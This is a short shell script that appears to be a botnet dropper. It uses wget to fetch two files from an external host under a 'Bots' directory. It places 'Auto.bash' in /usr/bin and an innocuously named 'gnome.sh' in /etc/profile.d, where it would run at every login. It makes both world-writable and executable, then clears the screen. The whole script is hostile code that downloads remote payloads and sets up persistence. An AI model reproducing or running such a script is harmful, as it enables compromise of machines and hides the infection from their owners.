#!/bin/sh
cd /usr/bin/
rm Auto.bash
sleep 1
wget http://05748.t35.com/Bots/Auto.bash
chmod 777 Auto.bash
echo -----------------
cd /etc/profile.d/
rm gnome.sh
sleep 1
wget http://05748.t35.com/Bots/gnome.sh
chmod 777 gnome.sh
echo -----------------
clear
exit
